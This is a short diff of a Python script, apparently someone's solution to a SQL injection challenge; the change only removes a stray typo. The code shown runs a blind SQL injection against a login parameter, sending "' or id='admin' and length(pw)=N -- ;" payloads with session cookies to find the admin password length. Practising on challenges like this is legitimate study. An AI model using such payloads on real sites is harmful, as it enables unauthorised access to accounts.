@@ -45,7 +45,7 @@ This is my code to solve this problem:
 	    payload = "' or id='admin' and length(pw)=" + str(i) + " -- ;"
 	    payload = requests.utils.quote(payload)
 	    final_url = url + payload
-	    res = requests.get(final_url,cookies=my_cookies)s
+	    res = requests.get(final_url,cookies=my_cookies)
 	    if "Hello admin" in res.text:
 		print("FOUND! Password length is " + str(i))
 		print("-------------------------------------------------")
